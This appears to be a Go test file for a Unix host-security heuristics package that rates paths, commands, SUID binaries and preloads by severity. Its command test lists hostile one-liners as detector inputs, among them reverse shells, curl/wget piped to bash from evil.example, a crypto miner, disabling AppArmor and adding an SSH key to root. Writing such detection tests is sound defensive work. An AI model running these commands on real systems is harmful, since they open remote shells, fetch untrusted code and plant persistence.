package heuristics

import (
	"testing"

	"husmea/internal/core"
)

func TestClassifyUnixPath(t *testing.T) {
	cases := []struct {
		p   string
		cat string
		sev core.Severity
	}{
		{"/dev/shm/x", "shm", core.High},
		{"/tmp/a/b", "temp", core.High},
		{"/tmp/.hidden/x", "temphidden", core.High},
		{"/dev/.lib/x", "dev", core.Critical},
		{"/home/bob/.local/kitty.app/bin/kitty", "homedev", core.Info},
		{"/home/bob/.opencode/bin/opencode", "homedev", core.Info},
		{"/home/bob/.cache/xyz/miner", "homehidden", core.Medium},
		{"/home/bob/.x", "homehidden", core.High},
		{"/home/bob/Descargas/tool", "home", core.Low},
		{"/root/x", "home", core.Low},
		{"/usr/bin/ls", "system", core.Info},
		{"/usr/lib/.x/y", "syshidden", core.High},
		{"/opt/app/bin/app", "local", core.Info},
		{"/snap/core/1/bin/x", "managed", core.Info},
		{"/etc/x/run.sh", "unusual", core.Medium},
		{"/var/www/html/x", "web", core.High},
	}
	for _, c := range cases {
		if l := ClassifyUnixPath(c.p); l.Category != c.cat || l.Severity != c.sev {
			t.Errorf("ClassifyUnixPath(%s) = %+v, want %s/%s", c.p, l, c.cat, c.sev)
		}
	}
}

func TestAssessUnixCommand(t *testing.T) {
	bad := map[string]core.Severity{
		`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`:                                       core.Critical,
		`nc -e /bin/sh 10.0.0.1 4444`:                                                  core.Critical,
		`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f`:  core.Critical,
		`curl -fsSL http://evil.example/x.sh | bash`:                                   core.High,
		`wget -q -O- http://1.2.3.4/a | sh`:                                            core.High,
		`echo ZWNobyBoaQ== | base64 -d | bash`:                                         core.High,
		`./xmrig -o stratum+tcp://pool:3333 --donate-level 1`:                          core.Critical,
		`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("1.2.3.4",9))'`: core.High,
		`LD_PRELOAD=/tmp/x.so ls`:                                                      core.High,
		`systemctl stop apparmor`:                                                      core.High,
		`echo ssh-rsa AAAA >> /root/.ssh/authorized_keys`:                              core.High,
		`/tmp/.x/run`:             core.High,
		`cd /tmp && sh /tmp/a.sh`: core.High,
	}
	for cmd, min := range bad {
		if rs := AssessUnixCommand(cmd); MaxSeverity(rs) < min {
			t.Errorf("AssessUnixCommand(%q) = %v, want >= %s", cmd, rs, min)
		}
	}
	good := []string{
		`/usr/sbin/sshd -D`,
		`/usr/bin/find /tmp -type f -mtime +7 -delete`,
		`test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )`,
		`/usr/lib/systemd/systemd-tmpfiles --clean`,
	}
	for _, cmd := range good {
		if rs := AssessUnixCommand(cmd); len(rs) > 0 {
			t.Errorf("benign %q flagged: %v", cmd, rs)
		}
	}
}

func TestAssessUnixExecutable(t *testing.T) {
	// Packaged binary in a system dir: clean.
	if rs := AssessUnixExecutable(UnixExe{Path: "/usr/sbin/sshd", Exists: true, PkgKnown: true, Owner: "openssh-server"}); len(rs) != 0 {
		t.Errorf("packaged sshd flagged: %v", rs)
	}
	// Unpackaged file in /usr/bin: high.
	if rs := AssessUnixExecutable(UnixExe{Path: "/usr/bin/kthreadd", Exists: true, PkgKnown: true}); MaxSeverity(rs) != core.High {
		t.Errorf("unpackaged /usr/bin = %v", rs)
	}
	// sshd outside its dir and not packaged: critical masquerade.
	if rs := AssessUnixExecutable(UnixExe{Path: "/var/tmp/sshd", Exists: true, PkgKnown: true}); MaxSeverity(rs) != core.Critical {
		t.Errorf("fake sshd = %v", rs)
	}
	// Packaged helper named "init" in /usr/share and vendor script in /etc: not flagged.
	if rs := AssessUnixExecutable(UnixExe{Path: "/usr/share/mosquitto/user/bin/init", Exists: true, PkgKnown: true, Owner: "mosquitto"}); len(rs) != 0 {
		t.Errorf("packaged init flagged: %v", rs)
	}
	if rs := AssessUnixExecutable(UnixExe{Path: "/etc/mysql/debian-start", Exists: true, PkgKnown: true, Vendor: true}); len(rs) != 0 {
		t.Errorf("vendor /etc script flagged: %v", rs)
	}
	// Non-vendor inline interpreter is low.
	if rs := AssessUnixExecutable(UnixExe{CommandLine: `/bin/sh -c "echo hi"`}); MaxSeverity(rs) != core.Low {
		t.Errorf("inline sh = %v", rs)
	}
}

func TestSplitUnixCommand(t *testing.T) {
	cases := map[string]string{
		`/usr/bin/foo --bar`:               "/usr/bin/foo",
		`"/opt/My App/run" x`:              "/opt/My App/run",
		`FOO=1 BAR=2 /usr/bin/env python3`: "python3",
		`nohup /tmp/x &`:                   "/tmp/x",
		`test`:                             "test",
	}
	for in, want := range cases {
		if got := SplitUnixCommand(in); got != want {
			t.Errorf("SplitUnixCommand(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestAssessSUID(t *testing.T) {
	yes, no := true, false
	if v := AssessSUID("/usr/bin/passwd", true, &yes); v != nil {
		t.Errorf("passwd flagged: %+v", v)
	}
	if v := AssessSUID("/usr/bin/find", true, &yes); v == nil || v.Severity != core.Critical {
		t.Errorf("suid find = %+v", v)
	}
	if v := AssessSUID("/tmp/.x/sh", true, nil); v == nil || v.Severity != core.Critical {
		t.Errorf("suid in tmp = %+v", v)
	}
	if v := AssessSUID("/usr/bin/weird", true, &no); v == nil || v.Severity != core.High {
		t.Errorf("unpackaged suid = %+v", v)
	}
	if v := AssessSUID("/usr/lib/foo/helper", true, &yes); v != nil {
		t.Errorf("packaged unknown suid = %+v", v)
	}
}

func TestAssessPreloadAndParents(t *testing.T) {
	if rs := AssessPreload("libmozsandbox.so"); len(rs) != 0 {
		t.Errorf("firefox preload flagged: %v", rs)
	}
	if rs := AssessPreload("/tmp/.l/libhide.so"); MaxSeverity(rs) != core.High {
		t.Errorf("tmp preload = %v", rs)
	}
	if r := UnixParentChild("apache2", "sh"); r == nil {
		t.Error("apache2 -> sh not flagged")
	}
	if r := UnixParentChild("bash", "sh"); r != nil {
		t.Error("bash -> sh flagged")
	}
}
